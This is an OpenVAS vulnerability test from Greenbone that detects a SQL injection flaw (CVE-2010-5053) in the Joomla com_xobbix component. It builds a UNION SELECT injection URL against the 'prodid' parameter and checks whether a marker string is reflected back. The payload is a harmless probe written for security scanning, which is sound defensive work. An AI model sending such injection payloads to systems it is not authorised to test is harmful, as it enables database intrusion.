###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_39259.nasl 12055 2018-10-24 12:00:58Z asteins $
#
# Joomla! 'com_xobbix' Component 'prodid' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103355");
  script_bugtraq_id(39259);
  script_cve_id("CVE-2010-5053");
  script_version("$Revision: 12055 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Joomla! 'com_xobbix' Component 'prodid' Parameter SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39259");

  script_tag(name:"last_modification", value:"$Date: 2018-10-24 14:00:58 +0200 (Wed, 24 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-12-05 12:01:34 +0100 (Mon, 05 Dec 2011)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"The 'com_xobbix' component for Joomla! is prone to an SQL-injection
  vulnerability because it fails to sufficiently sanitize user-supplied
  data before using it in an SQL query.");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities
  in the underlying database.");

  exit(0);
}

CPE = "cpe:/a:joomla:joomla";

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(port:port, cpe:CPE)) exit(0);

if(dir == "/") dir = "";

url = string(dir, "/index.php?option=com_xobbix&catid=31&task=prod_desc&prodid=-21+union+select+1,2,3,4,0x53514c2d496e6a656374696f6e2d54657374,6,7,8,9,10,11,12,13,14,15,16--");

if(http_vuln_check(port:port, url:url,pattern:"SQL-Injection-Test")) {
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
